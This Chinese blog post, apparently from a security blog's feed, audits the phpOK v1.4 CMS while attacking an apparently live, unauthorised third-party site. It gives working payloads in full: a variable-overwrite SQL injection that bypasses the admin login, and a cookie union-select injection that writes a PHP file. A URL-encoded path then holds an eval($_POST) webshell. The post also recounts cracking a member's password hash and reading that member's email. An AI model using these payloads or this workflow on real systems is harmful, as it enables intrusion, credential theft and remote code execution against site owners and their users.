    <content type="html"><![CDATA[<h1 id="phpok1-4审计小记"><a href="#phpok1-4审计小记" class="headerlink" title="phpok1.4审计小记"></a>phpok1.4审计小记</h1><h2 id="0x00-概要"><a href="#0x00-概要" class="headerlink" title="0x00 概要"></a>0x00 概要</h2><p>变量覆盖&amp;sql注入&amp;webshell</p><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>直觉扫了下目录，发现存在如下敏感文件与目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://103.x.x.x/admin.php        200</span><br><span class="line">http://103.x.x.x/admin/           403</span><br></pre></td></tr></table></figure></p><p><img src="https://ooo.0o0.ooo/2017/05/23/59237e72d5c8a.png" alt="image"><br><img src="https://ooo.0o0.ooo/2017/05/23/59237ed9695a8.png" alt="image"></p><p>在admin/目录下发现有error_log 里面记录了一些php的错误日志记录<br><img src="https://ooo.0o0.ooo/2017/05/23/59237f60127b2.png" alt="image"><br>这里面有很明显的痕迹，大多数文件都以xx.qg.php命名，去百度搜了一波，得到CMS情感家园(qgweb)，但这是什么CMS，从来没见过，也没有任何信息提供该CMS的版本等等，这个思路挂了</p><p>试了下万能密码，弱口令，都是不存在的，但是在登录过程中发现了版本号与CMS型号。</p><p><img src="https://ooo.0o0.ooo/2017/05/23/592380aa71e4c.png" alt="image"><br><img src="https://ooo.0o0.ooo/2017/05/23/592380ac00e7d.png" alt="image"><br>get到==phpOK v1.4==</p><h2 id="0x02-源码审计"><a href="#0x02-源码审计" class="headerlink" title="0x02 源码审计"></a>0x02 源码审计</h2><p>黑盒测试不来，我们有源码，很坑的一点，这个CMS有点老了，支持php4.3的，放到php5里面登录不成功，其他功能不影响，就懒得改，没有本地测试admin.php，我们想绕过登录进后台，主要看admin.php，有几点值得记录</p><p><strong>变量覆盖</strong><br><img src="https://ooo.0o0.ooo/2017/05/23/592381a2c9db4.png" alt="image"></p><p><strong>关键登录代码</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">"admin"</span>][<span class="string">"user"</span>] &amp;&amp; $_SESSION[<span class="string">"admin"</span>][<span class="string">"pass"</span>] &amp;&amp; strpos($act,<span class="string">"login"</span>) === <span class="keyword">false</span> &amp;&amp; $act != <span class="string">"logout"</span>)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($file,<span class="string">"open."</span>) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;body style='margin:0px;padding:0px' bgcolor='#f1f1e3'&gt;&lt;table width='100%' height='100%'&gt;&lt;tr&gt;&lt;td align='center' style='color:red;font:normal 12px 宋体,Tahoma,Arial'&gt;只有后台管理员才有权限上传图片！&lt;/td&gt;&lt;tr&gt;&lt;/table&gt;&lt;body&gt;&lt;/html&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#[管理员未登录，开启登录页]</span></span><br><span class="line"><span class="keyword">if</span>($act == <span class="string">"loginok"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($username) || <span class="keyword">empty</span>($password))</span><br><span class="line">&#123;</span><br><span class="line">Error(<span class="string">"用户名或密码或认证码为空..."</span>,<span class="string">"admin.php?act=login"</span>,<span class="number">2</span>,<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">#[对认证码进行验证]</span></span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">"imagecreate"</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($chk))</span><br><span class="line">&#123;</span><br><span class="line">Error(<span class="string">"验证码不能为空！"</span>,<span class="string">"admin.php?act=login"</span>,<span class="number">2</span>,<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">$chkCookie = $_COOKIE[<span class="string">"qgLoginChk"</span>];</span><br><span class="line">$chk = md5(strtolower($chk));</span><br><span class="line"><span class="keyword">if</span>($chk != $chkCookie)</span><br><span class="line">&#123;</span><br><span class="line">Error(<span class="string">"认证码输入不正确！"</span>,<span class="string">"admin.php?act=login"</span>,<span class="number">2</span>,<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$rows = $DB-&gt;qgGetOne(<span class="string">"SELECT * FROM "</span>.$prefix.<span class="string">"admin WHERE user='"</span>.$username.<span class="string">"' AND pass='"</span>.md5($password).<span class="string">"' LIMIT 0,1"</span>);</span><br><span class="line"><span class="keyword">if</span>($rows)</span><br><span class="line">&#123;</span><br><span class="line">$_SESSION[<span class="string">"admin"</span>] = $rows;</span><br><span class="line"><span class="comment">#[写入Win用户的Cookie]</span></span><br><span class="line">Error(<span class="string">"管理员 &lt;strong&gt;"</span>.$rows[<span class="string">"user"</span>].<span class="string">"&lt;/strong&gt; 登录后台..."</span>,<span class="string">"admin.php"</span>,<span class="number">2</span>,<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Error(<span class="string">"管理员账号或密码不正确..."</span>,<span class="string">"admin.php?act=login"</span>,<span class="number">2</span>,<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>($act == <span class="string">"logout"</span>)</span><br><span class="line">&#123;</span><br><span class="line">session_destroy();</span><br><span class="line">Error(<span class="string">"管理员成功退出..."</span>,<span class="string">"admin.php?act=login"</span>,<span class="number">2</span>,<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;title&gt;管理员登录 -- Powered By PhpOK.Com&lt;/title&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/head&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;body&gt;"</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"./admin/tpl/admin_login.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/body&gt;&lt;/html&gt;"</span>;</span><br><span class="line">$DB-&gt;qgClose();</span><br><span class="line">ob_end_flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们先来看登录后台的地方(PS:验证码判断机制也很鸡肋有木有)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rows = $DB-&gt;qgGetOne(<span class="string">"SELECT * FROM "</span>.$prefix.<span class="string">"admin WHERE user='"</span>.$username.<span class="string">"' AND pass='"</span>.md5($password).<span class="string">"' LIMIT 0,1"</span>);</span><br></pre></td></tr></table></figure></p><p>这里面$prefix是数据库的表前缀，在config里有定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#[数据表前缀，如果同一个数据库中要安装多个套程序，请手动修改]</span><br><span class="line">$prefix = &quot;qinggan_&quot;;</span><br></pre></td></tr></table></figure></p><p>既然可以变量覆盖，那么<code>$prefix</code>就是可控部分了，下面看下过滤部分</p><p><img src="https://ooo.0o0.ooo/2017/05/23/592384281e5eb.png" alt="image"></p><p>get/post时，过滤<code>&#39;</code> <code>&quot;</code> <code>\</code> 没有过滤<code>,</code> <code>()</code> <code>#</code></p><p>$prefix没有被单引号包含，这样就可以了，我们来构造一波</p><p>show code(一个骚套路):</p><p><img src="https://ooo.0o0.ooo/2017/05/23/5923869366598.png" alt="image"></p><p>在关键登录代码中，我们可以看到他查询到$rows进行判断，若存在，则登录成功，我们直接绕过查询，执行的sql语句:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> =(<span class="keyword">select</span>+<span class="number">0x61646d696e</span>+<span class="keyword">as</span>+<span class="keyword">user</span>,<span class="number">2</span>+<span class="keyword">as</span>+pass)i;</span><br></pre></td></tr></table></figure></p><p>So.变量覆盖+SQL注入<br><img src="https://ooo.0o0.ooo/2017/05/23/592388de66ec3.png" alt="image"></p><p>这样就进入后台了，其中有点小坑，登录后访问admin.php自动跳转adminn.php，而adminn.php 404了，在源码里有写$_GET[‘file’],我们来看下</p><p><img src="https://ooo.0o0.ooo/2017/05/23/592389dcce7dd.png" alt="image"></p><p>而且，Burp抓包也指向了这一点</p><p><img src="https://ooo.0o0.ooo/2017/05/23/59238bb06df19.png" alt="image"></p><h2 id="0x03-后台操作"><a href="#0x03-后台操作" class="headerlink" title="0x03 后台操作"></a>0x03 后台操作</h2><p>登录了，我们来找找上传点，插个一句话<br><img src="https://ooo.0o0.ooo/2017/05/23/59238cb231c85.png" alt="image"></p><p>然而..悲剧…没有上传点!?添加图片也是失败，应该是没有目录权限，雪崩，后台进了没卵用？惊喜，发现会员列表里竟然保存着163邮箱和密码md5，解一下，成功登录，然而看了半天邮件，并没有什么异常，发现思路跑偏，滚回去审计其他注入点，看哪里能写文件。<br><img src="https://ooo.0o0.ooo/2017/05/23/59238e061d02e.png" alt="F17BF9DE-443C-45A7-A703-41E5A8C10FCE.png"></p><h2 id="0x04-又是源码审计"><a href="#0x04-又是源码审计" class="headerlink" title="0x04 又是源码审计!?"></a>0x04 又是源码审计!?</h2><p>没错，有了源码，没有日不下来的站，换个思路，看前台有没有getshell的地方</p><p><code>search.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#[快速搜索]</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"./global.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($keys) || <span class="keyword">empty</span>($sType))</span><br><span class="line">&#123;</span><br><span class="line">Error($langs[<span class="string">"search_keys"</span>],<span class="string">"index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">"article,product,picture,download"</span>,$sType) === <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$sType = <span class="string">"article"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[获取分类]</span></span><br><span class="line">$rows = $DB-&gt;qgGetAll(<span class="string">"SELECT id,name FROM "</span>.$prefix.<span class="string">"cate WHERE language='"</span>.$language.<span class="string">"' AND catetype='"</span>.$sType.<span class="string">"' AND ifuse=0"</span>);</span><br><span class="line">$idList = $catelist = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($rows <span class="keyword">AS</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">$catelist[$value[<span class="string">"id"</span>]] = $value;</span><br><span class="line">$idList[] = $value[<span class="string">"id"</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$condition = <span class="string">"WHERE 1 AND ifcheck=1"</span>;</span><br><span class="line"></span><br><span class="line">$idIN = implode(<span class="string">","</span>,$idList);</span><br><span class="line"><span class="keyword">if</span>($idIN)</span><br><span class="line">&#123;</span><br><span class="line">$condition .= <span class="string">" AND cateid IN("</span>.$idIN.<span class="string">")"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$keys = rawurldecode($keys);</span><br><span class="line">$keywords = $keys;</span><br><span class="line"></span><br><span class="line">$keywords = str_replace(<span class="string">" "</span>,<span class="string">"%"</span>,$keywords);</span><br><span class="line"><span class="comment">#[判断是否有%]</span></span><br><span class="line"><span class="keyword">if</span>(strpos($keywords,<span class="string">"%"</span>) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$keywordsArray = explode(<span class="string">"%"</span>,$keywords);</span><br><span class="line">$c_01 = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($keywordsArray <span class="keyword">AS</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">$value = trim($value);</span><br><span class="line"><span class="keyword">if</span>($value)</span><br><span class="line">&#123;</span><br><span class="line">$c_01[] = <span class="string">"subject LIKE '%"</span>.$value.<span class="string">"%'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(count($c_01)&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$condition .= <span class="string">"AND ("</span>.implode(<span class="string">" OR "</span>,$c_01).<span class="string">")"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>($keywords)</span><br><span class="line">&#123;</span><br><span class="line">$condition .= <span class="string">" AND subject LIKE '%"</span>.$keywords.<span class="string">"%'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$count = $DB-&gt;qgCount(<span class="string">"SELECT id FROM "</span>.$prefix.$sType.<span class="string">" "</span>.$condition);</span><br><span class="line">$psize = <span class="number">30</span>;</span><br><span class="line">$url = <span class="string">"search.php?sType="</span>.$sType.<span class="string">"&amp;keys="</span>.rawurlencode($keys);</span><br><span class="line">$pageList = page($url,$count,$psize,$pageid);</span><br><span class="line">$offset = $pageid&gt;<span class="number">0</span> ? ($pageid<span class="number">-1</span>)*$psize : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">$rows = $DB-&gt;qgGetAll(<span class="string">"SELECT * FROM "</span>.$prefix.$sType.<span class="string">" "</span>.$condition.<span class="string">" ORDER BY postdate DESC LIMIT "</span>.$offset.<span class="string">","</span>.$psize);</span><br><span class="line"></span><br><span class="line">$list = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($rows <span class="keyword">AS</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">$value[<span class="string">"postdate"</span>] = date(<span class="string">"Y-m-d"</span>,$value[<span class="string">"postdate"</span>]);</span><br><span class="line">$value[<span class="string">"url"</span>] = $sType.<span class="string">".php?id="</span>.$value[<span class="string">"id"</span>];</span><br><span class="line">$list[] = $value;</span><br><span class="line">&#125;</span><br><span class="line">Head($langs[<span class="string">"search"</span>]);</span><br><span class="line">$TPL-&gt;SetFile(<span class="string">"search"</span>);</span><br><span class="line">$TPL-&gt;n();</span><br><span class="line">Foot(<span class="string">"search"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>看下search搜索的时候能不能注入，首先require_once(‘./global.php’)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$magic_quotes_gpc = get_magic_quotes_gpc();</span><br><span class="line">@extract(daddslashes($_POST));</span><br><span class="line">@extract(daddslashes($_GET));</span><br><span class="line">if(!$magic_quotes_gpc) &#123;</span><br><span class="line">$_FILES = daddslashes($_FILES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function daddslashes($string, $force = 0)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#[加载常用函数及对象]</span><br><span class="line">...</span><br><span class="line">#[加载数据库]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#[设置Session信息]</span><br><span class="line">...</span><br><span class="line">#[加载语言包]</span><br><span class="line">if($language)</span><br><span class="line">&#123;</span><br><span class="line">setcookie(&quot;qgLanguage&quot;,$language);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">if($_COOKIE[&quot;qgLanguage&quot;])</span><br><span class="line">&#123;</span><br><span class="line">$language = $_COOKIE[&quot;qgLanguage&quot;];</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$getDefaultLang = $DB-&gt;qgGetOne(&quot;SELECT id FROM &quot;.$prefix.&quot;lang WHERE ifdefault=1&quot;);</span><br><span class="line">$language = $getDefaultLang[&quot;id&quot;];</span><br><span class="line">unset($getDefaultLang);</span><br><span class="line">setcookie(&quot;qgLanguage&quot;,$language);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">require_once(&quot;./include/global.func.php&quot;);</span><br><span class="line"></span><br><span class="line">#[如果不存在语言包及语言ID时]</span><br><span class="line">if(empty($language))</span><br><span class="line">&#123;</span><br><span class="line">ErrorMsg(&quot;Not Language...&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#[加载语言变量]</span><br><span class="line">if(file_exists(&quot;./data/language_&quot;.$language.&quot;.php&quot;))</span><br><span class="line">&#123;</span><br><span class="line">include_once(&quot;./data/language_&quot;.$language.&quot;.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">#[如果语言变量没有生成缓存文件，则从数据库中读取，重新生成缓存文件]</span><br><span class="line">$rs = $DB-&gt;qgGetAll(&quot;SELECT * FROM &quot;.$prefix.&quot;langc WHERE langid=&apos;&quot;.$language.&quot;&apos;&quot;);</span><br><span class="line">$langs = array();</span><br><span class="line">foreach($rs AS $k=&gt;$v)</span><br><span class="line">&#123;</span><br><span class="line">$langs[$v[&quot;var&quot;]] = $v[&quot;content&quot;];</span><br><span class="line">&#125;</span><br><span class="line">#[将数据写入文件中]</span><br><span class="line">$FS-&gt;qgWrite($langs,&quot;./data/language_&quot;.$language.&quot;.php&quot;,&quot;langs&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现另外一个可控点Cookie:qgLanguage=xxx，并且可以写文件!?<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$getDefaultLang = $DB-&gt;qgGetOne(&quot;SELECT id FROM &quot;.$prefix.&quot;lang WHERE ifdefault=1&quot;);</span><br></pre></td></tr></table></figure></p><p>这里我们来看下$language逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.加载语言包 if($language) (不存在)-&gt; $language = $_COOKIE[&quot;qgLanguage&quot;];从cookie:qgLanguage里传值给$language</span><br><span class="line">b.加载语言变量 if(file_exists(&quot;./data/language_&quot;.$language.&quot;.php&quot;)) (不存在)-&gt; 查询 -&gt;写入文件</span><br></pre></td></tr></table></figure><p>So.构造qgLanguage<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qgLanguage=xxoo&apos; union select 1,2,&apos;xxoo&apos;,&apos;&#123;$&#123;phpinfo()&#125;&#125;&apos;+from dual%23</span><br></pre></td></tr></table></figure></p><p>最后，文件地址就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x/data/%6c%61%6e%67%75%61%67%65%5f%78%78%6f%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%27%78%78%6f%7a%6f%27%2c%27%7b%24%7b%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%34%39%5d%29%7d%7d%27%20%66%72%6f%6d%20%64%75%61%6c%23%2e%70%68%70.php</span><br></pre></td></tr></table></figure></p><p>注意这里要把文件名<code>language_xxoo&#39; union select 1,2,&#39;xxoo&#39;,&#39;{${phpinfo()}}&#39;+from dual%23</code>编码一次，不然会找不到页面</p><p>最后 <strong>getshell</strong></p><p><img src="https://ooo.0o0.ooo/2017/05/25/592670d944d0d.png" alt="image.png"></p><p>Ps:低权限，未完待续</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;phpok1-4审计小记&quot;&gt;&lt;a href=&quot;#phpok1-4审计小记&quot; class=&quot;headerlink&quot; title=&quot;phpok1.4审计小记&quot;&gt;&lt;/a&gt;phpok1.4审计小记&lt;/h1&gt;&lt;h2 id=&quot;0x00-概要&quot;&gt;&lt;a href=&quot;#0x00-概要&quot; class=&quot;headerlink&quot; title=&quot;0x00 概要&quot;&gt;&lt;/a&gt;0x00 概要&lt;/h2&gt;&lt;p&gt;变量覆盖&amp;amp;sql注入&amp;amp;webshell&lt;/p&gt;
    
    </summary>
    
    
      <category term="审计" scheme="http://yoursite.com/tags/%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
